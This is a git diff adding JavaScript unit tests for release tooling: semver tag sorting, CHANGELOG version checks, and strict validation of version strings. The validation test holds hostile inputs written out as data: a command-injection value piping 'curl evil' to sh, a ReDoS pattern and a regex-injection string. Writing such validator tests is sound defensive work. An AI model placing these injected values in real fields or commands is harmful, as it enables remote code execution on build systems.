@@ -11,6 +11,7 @@ import {
   CHANGELOG,
   changelogSection,
   compareVersions,
+  highestTagVersion,
   kitClosureFiles,
   newestChangelogVersion,
   parseVersion,
@@ -128,4 +129,17 @@ test('does NOT fire on a docs-only change', () => {
 
 test('fires on a CHANGELOG mismatch', () => {
   assert.notEqual(pluginVersion('{"version": "0.2.0"}'), newestChangelogVersion('## [0.1.0] - 2026-09-23\n'));
+});
+
+test('highestTagVersion: the highest vX.Y.Z tag by semver, ignoring anything else', () => {
+  assert.equal(highestTagVersion(['v0.1.0', 'v0.10.0', 'v0.9.0', '']), '0.10.0');
+  assert.equal(highestTagVersion(['v1.0.0-rc.1', 'latest', 'v0.2.0']), '0.2.0');
+  assert.equal(highestTagVersion([]), null);
+});
+
+test('pluginVersion and changelogSection refuse anything but a strict x.y.z (it becomes a tag and a RegExp)', () => {
+  assert.throws(() => pluginVersion(JSON.stringify({ version: '0.1.0$(curl evil|sh)' })), /not a semver/);
+  assert.throws(() => pluginVersion(JSON.stringify({ version: '0.1.0(a+)+' })), /not a semver/);
+  assert.throws(() => changelogSection('## [0.1.0]\nx\n', '0.1.0|.*'), /not a semver/);
+  assert.equal(pluginVersion(JSON.stringify({ version: '0.1.0' })), '0.1.0');
 });
